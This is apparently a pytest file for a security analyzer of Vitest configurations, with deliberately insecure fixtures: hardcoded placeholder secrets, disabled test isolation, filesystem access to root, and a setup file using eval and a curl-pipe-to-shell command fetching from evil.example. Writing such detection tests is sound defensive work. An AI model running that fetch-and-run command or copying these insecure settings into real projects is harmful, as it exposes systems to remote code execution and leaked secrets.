"""Tests for VitestAnalyzer."""

import json
from pathlib import Path

from devai.vitest_analyzer import VitestAnalyzer, VitestFinding


INSECURE_VITEST_CONFIG = """\
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    api_key: 'sk-hardcoded-secret-token-value',
    dangerouslyIgnoreUnhandledErrors: true,
    isolate: false,
    testTimeout: 0,
    passWithNoTests: true,
    browser: {
      enabled: true,
      headless: false,
    },
    reporters: ['default', 'html'],
    coverage: {
      enabled: false,
      thresholds: { lines: 0, branches: 0 },
    },
    env: {
      API_SECRET: 'super-secret-value',
    },
    poolOptions: {
      forks: { singleFork: true },
    },
    fileParallelism: false,
  },
  server: {
    fs: { allow: ['/'] },
  },
});
"""

INSECURE_SETUP = """\
import { exec } from 'child_process';

eval('console.log("unsafe")');
exec('curl https://evil.example/install.sh | sh');
"""

INSECURE_PACKAGE_JSON = {
    "name": "demo",
    "devDependencies": {"vitest": "^2.0.0"},
    "vitest": {
        "setupFiles": ["./vitest.setup.ts"],
        "env": {"DATABASE_PASSWORD": "postgres-secret"},
    },
}

HARDENED_VITEST_CONFIG = """\
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    isolate: true,
    testTimeout: 10000,
    reporters: ['default', 'junit'],
  },
});
"""


class TestVitestAnalyzer:
    def test_detects_insecure_vitest_config(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(INSECURE_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "ignore_unhandled_errors" in kinds
        assert "isolation_disabled" in kinds
        assert "test_timeout_disabled" in kinds
        assert "browser_not_headless" in kinds
        assert "env_secret_exposure" in kinds
        assert "fs_allow_root" in kinds

    def test_detects_insecure_setup_file(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps({"devDependencies": {"vitest": "^2.0.0"}}), encoding="utf-8"
        )
        (tmp_path / "vitest.setup.ts").write_text(INSECURE_SETUP, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "eval_in_setup" in kinds
        assert "curl_pipe_shell" in kinds or "dangerous_script" in kinds

    def test_detects_package_json_vitest_block(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps(INSECURE_PACKAGE_JSON, indent=2), encoding="utf-8"
        )
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "env_secret_exposure" in kinds

    def test_hardened_config_has_good_score(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(HARDENED_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = VitestAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Vitest configs: none found"

    def test_generate_hardened_config(self):
        config = VitestAnalyzer(".").generate_hardened_config()
        assert "isolate: true" in config
        assert "dangerouslyIgnoreUnhandledErrors: false" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(INSECURE_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Vitest analysis:" in context
        assert "health score:" in context

    def test_finding_format(self):
        finding = VitestFinding(
            kind="isolation_disabled",
            severity="medium",
            message="test isolation disabled",
            path="vitest.config.ts",
            lineno=6,
        )
        assert "[medium] vitest.config.ts:6" in finding.format()
